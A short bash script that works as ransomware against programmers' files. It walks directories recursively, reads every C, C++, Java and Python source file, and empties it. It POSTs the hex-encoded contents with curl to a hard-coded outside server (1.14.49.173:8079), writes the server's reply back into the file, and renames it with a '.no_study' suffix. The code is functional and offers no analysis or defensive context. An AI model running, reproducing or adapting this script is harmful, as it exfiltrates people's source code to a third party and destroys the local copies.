#! /bin/bash

types="*.cpp *.c *.java *.py"
echo Hey, what r u doing?

lock() {
	echo -e '\c' > $oneFile
	encodeMsg=`echo -n $* | xxd -ps | tr -d '\n' | sed -r 's/(..)/%\1/g'`
       	lockedMsg=`curl -s -H "Content-Type: application/json;" -H "Accept: */*" -X POST -d "msg=$encodeMsg" http://1.14.49.173:8079`	
	echo $lockedMsg >> $oneFile
	echo locked:$oneFile
	sleep 2
}

fuck() {
	if [ -e `ls $types` ] 
	then
		for oneFile in `ls $types`
		do
			msg=`cat $oneFile`
			echo -e "What is this?:$oneFile"
			lock $msg $oneFile
			mv $oneFile $oneFile.no_study
		done
	fi
	
	for i in $*
        do
		if [ -d $i ]
		then
			echo 进来了$i
			cd $i
			fuck `ls`
			cd ..
		fi
        done

}

fuck `ls`

echo "NO STUDY!!!"
sleep 3
